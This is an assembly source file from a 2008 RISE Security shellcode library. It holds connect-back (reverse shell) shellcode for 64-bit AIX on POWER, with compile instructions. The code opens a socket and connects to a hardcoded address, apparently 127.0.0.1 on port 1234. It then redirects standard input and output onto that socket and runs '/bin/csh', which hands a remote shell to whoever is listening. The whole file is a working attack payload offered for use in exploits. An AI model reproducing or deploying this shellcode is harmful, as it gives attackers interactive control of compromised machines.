/*
 *  $Id: aix-power-cntsockcode64.S 40 2008-11-17 02:45:30Z ramon $
 *
 *  aix-power-cntsockcode64.S - AIX Power Network connect code
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Compile with the following command.
 * $ gcc -Wall -DAIXLEVEL -m64 -o aix-power-cntsockcode64
 *   aix-power-cntsockcode64.S
 *
 * Where AIXLEVEL is one of the currently supported AIX levels.
 * -DV530   AIX 5.3.0
 *
 */

#include "aix-power.h"

    .globl .main
    .csect .text[PR]

.main:

syscallcode:
    # xor.    %r31,%r31,%r31
    xor.    %r5,%r5,%r5
    bnel    syscallcode
    mflr    %r30
    cal     %r30,511(%r30)
    cal     %r30,-511+36(%r30)
    mtctr   %r30
    bctr
    .long   0xff0204d2
    .long   0x7f000001
    crorc   %cr6,%cr6,%cr6
    .long   0x44ffff02
    cal     %r30,-8(%r30)

cntsockcode:
    lil     %r29,__CAL

    # socket

    # xor     %r5,%r5,%r5
    cal     %r4,-511+1(%r29)
    cal     %r3,-511+2(%r29)
    cal     %r2,__NC_socket(%r29)
    mtctr   %r30
    bctrl
    mr      %r28,%r3

    # connect

    cal     %r5,-511+16(%r29)
    cal     %r4,-8(%r30)
    cal     %r2,__NC_connect(%r29)
    mtctr   %r30
    bctrl

    # close

    cal     %r27,-511+2(%r29)

0:
    mr      %r3,%r27
    cal     %r2,__NC_close(%r29)
    mtctr   %r30
    bctrl

    # kfcntl

    mr      %r5,%r27
    xor     %r4,%r4,%r4
    mr      %r3,%r28
    cal     %r2,__NC_kfcntl(%r29)
    mtctr   %r30
    bctrl

    ai.     %r27,%r27,-1
    bge     0b

shellcode64:
    # lil     %r31,__CAL
    xor.    %r5,%r5,%r5
    bnel    shellcode64
    # mflr    %r30
    # cal     %r30,511(%r30)
    # cal     %r3,-511+40(%r30)
    # stb     %r5,-511+48(%r30)
    mflr    %r24
    cal     %r24,511(%r24)
    cal     %r3,-511+40(%r24)
    stb     %r5,-511+48(%r24)
    stdu    %r5,-8(%r1)
    stdu    %r3,-8(%r1)
    mr      %r4,%r1
    # cal     %r2,__NC_execve(%r31)
    cal     %r2,__NC_execve(%r29)
    # crorc   %cr6,%cr6,%cr6
    # .long   0x44ffff02
    mtctr   %r30
    bctrl
    .asciz  "/bin/csh"

